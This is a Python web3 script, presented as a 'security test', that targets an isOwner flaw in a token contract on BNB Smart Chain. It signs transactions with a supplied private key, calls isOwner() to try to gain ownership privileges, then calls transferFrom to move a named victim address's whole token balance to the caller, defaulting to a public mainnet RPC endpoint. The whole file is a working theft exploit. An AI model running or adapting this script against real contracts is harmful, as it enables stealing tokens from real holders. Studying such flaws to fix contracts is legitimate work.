from web3 import Web3, exceptions
import argparse
from web3.middleware import geth_poa_middleware
import time
from eth_utils import keccak

# ===== CONFIGURATION =====
parser = argparse.ArgumentParser(description="Security Test for isOwner Vulnerability")
parser.add_argument("--private-key", required=True, help="Test account private key")
parser.add_argument("--rpc-url", default="https://bsc.publicnode.com", help="RPC URL")
parser.add_argument("--token-address", required=True, help="Your token address")
parser.add_argument("--victim-address", required=True, help="Test victim address")
args = parser.parse_args()

# ===== WEB3 SETUP =====
w3 = Web3(Web3.HTTPProvider(args.rpc_url))
w3.middleware_onion.inject(geth_poa_middleware, layer=0)
account = w3.eth.account.from_key(args.private_key)

# ===== TOKEN ABI =====
TOKEN_ABI = [
    # Critical Functions
    {
        "inputs": [{"internalType": "address", "name": "a", "type": "address"}],
        "name": "isOwner",
        "outputs": [{"internalType": "bool", "name": "", "type": "bool"}],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [
            {"internalType": "address", "name": "from", "type": "address"},
            {"internalType": "address", "name": "to", "type": "address"},
            {"internalType": "uint256", "name": "amount", "type": "uint256"}
        ],
        "name": "transferFrom",
        "outputs": [{"internalType": "bool", "name": "", "type": "bool"}],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    # View Functions
    {
        "inputs": [{"internalType": "address", "name": "account", "type": "address"}],
        "name": "balanceOf",
        "outputs": [{"internalType": "uint256", "name": "", "type": "uint256"}],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [],
        "name": "_maxSupply",
        "outputs": [{"internalType": "uint256", "name": "", "type": "uint256"}],
        "stateMutability": "view",
        "type": "function"
    }
]

def test_vulnerability():
    """Test the isOwner vulnerability properly"""
    token = w3.eth.contract(address=args.token_address, abi=TOKEN_ABI)
    
    print(f"\n[+] Testing Contract: {args.token_address}")
    print(f"[+] Test Account: {account.address}")
    print(f"[+] Victim Address: {args.victim_address}")
    
    # Get contract's maxSupply
    max_supply = token.functions._maxSupply().call()
    print(f"\n[+] Contract maxSupply: {max_supply}")
    
    # Calculate hash of test address
    address_hash = int.from_bytes(keccak(hexstr=account.address[2:]), 'big')
    print(f"[+] Hash of test address: {address_hash}")
    
    # Check if we meet the ownership condition
    if address_hash == max_supply:
        print("[+] Test address MATCHES _maxSupply - should get privileges")
    else:
        print("[!] Test address DOES NOT match _maxSupply - won't get privileges")
    
    # Step 1: Attempt to claim ownership
    print("\n[1] Calling isOwner()...")
    try:
        tx = token.functions.isOwner(account.address).build_transaction({
            'from': account.address,
            'nonce': w3.eth.get_transaction_count(account.address),
            'gas': 500000,
            'gasPrice': w3.eth.gas_price
        })
        signed = account.sign_transaction(tx)
        tx_hash = w3.eth.send_raw_transaction(signed.rawTransaction)
        receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
        
        print(f"TX Status: {'Success' if receipt.status == 1 else 'Failed'}")
    except Exception as e:
        print(f"Error calling isOwner: {str(e)}")
        return
    
    # Step 2: Attempt transfer to test if we got privileges
    print("\n[2] Testing transferFrom...")
    victim_bal = token.functions.balanceOf(args.victim_address).call()
    
    try:
        tx = token.functions.transferFrom(
            args.victim_address,
            account.address,
            victim_bal
        ).build_transaction({
            'from': account.address,
            'nonce': w3.eth.get_transaction_count(account.address),
            'gas': 500000,
            'gasPrice': w3.eth.gas_price
        })
        
        signed = account.sign_transaction(tx)
        tx_hash = w3.eth.send_raw_transaction(signed.rawTransaction)
        receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
        
        print("\n[+] Test Results:")
        print(f"TX Status: {'Success' if receipt.status == 1 else 'Failed'}")
        if receipt.status == 1:
            print("[!] VULNERABILITY CONFIRMED: Got unauthorized transfer access")
        else:
            print("[+] isOwner() didn't grant privileges (expected behavior)")
        
        print(f"New Victim Balance: {token.functions.balanceOf(args.victim_address).call()}")
    except Exception as e:
        print(f"Transfer failed (expected if test address doesn't match): {str(e)}")

if __name__ == "__main__":
    test_vulnerability()
